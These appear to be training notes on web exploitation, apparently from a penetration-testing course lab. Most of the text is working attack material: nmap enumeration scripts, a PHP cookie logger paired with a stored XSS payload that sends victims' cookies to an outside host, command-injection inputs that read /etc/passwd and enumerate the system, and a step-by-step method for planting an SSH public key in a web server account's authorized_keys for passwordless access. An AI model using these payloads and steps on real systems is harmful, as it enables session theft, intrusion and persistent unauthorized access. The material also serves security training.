EXPLOIT RESEARCH

use sites like cve, exploit database, etc (kind of obvious)


WEB EXPLOIT

proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>



Demo: Stored XXS

  cookie.jar
  <?php
  $cookie = $_GET["username"];
  $steal = fopen("/var/www/html/cookiefile.txt", "a+");
  fwrite($steal, $cookie ."\n");
  fclose($steal);
  ?>

On the message board enter a name and then input the following javascript in the message field and submit.
 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>


Demo: Command Injection

    1. Demo-Web_Exploit_upload instance navigate to http://<float IP>/cmdinjection/cmdinjectdemo.php
    2. Ping a IP to show the page works as designed
    3. Showcase a few ways to successfully invoke command injection and perform system enumeration
     ; whoami
     ; cat /etc/passwd
     ; ls -latr & netstat -rn
     || ifconfig
    4. After enumeration, perform commands such as uploading your ssh key to gain access




SSH KEY UPLOAD
Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.

SSH Key Setup
    Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
    1. ssh-keygen -t rsa

    After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
    2. cat ~/.ssh/id_rsa.pub
	The entire output is your public key, make sure when uploading you copy everything 

Uploading SSH Key
On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
	The following process is done on target through command injection or malicious upload.
    Find out what account is running the web sever/commands.
     1. whoami

    Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

     2. www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

    Check to see if .ssh folder is in the users home directory. If not make it

     3.ls -la /users/home/directory      #check if .ssh exists
       mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist

    Echo ssh key to the authorized_keys file in the users .ssh folder.

     4. echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys

    Verify key has been uploaded successfully.

     5. cat /users/home/directory/.ssh/authorized_keys

Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.



